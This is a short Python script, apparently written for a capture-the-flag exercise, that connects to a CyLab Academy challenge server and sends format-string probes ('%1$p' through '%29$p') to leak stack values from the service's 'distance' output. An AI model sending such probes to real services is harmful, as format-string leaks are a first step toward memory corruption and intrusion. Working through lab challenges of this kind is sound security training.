import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 28899
try:
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(5)
    time.sleep(0.5)
    try:
        print("banner:", s.recv(4096).decode("utf-8", "replace")[:200])
    except Exception:
        pass
    for i in range(1, 30):
        s.sendall(f"%{i}$p\n".encode())
        time.sleep(0.15)
        try:
            data = s.recv(4096).decode("utf-8", "replace")
            m = re.search(r"distance: (0x[0-9a-f]+|\(nil\))", data)
            print(i, "->", m.group(1) if m else data.strip()[:60])
        except Exception as e:
            print(i, "err", e)
            break
    s.close()
except Exception as e:
    print("connexion err", e)
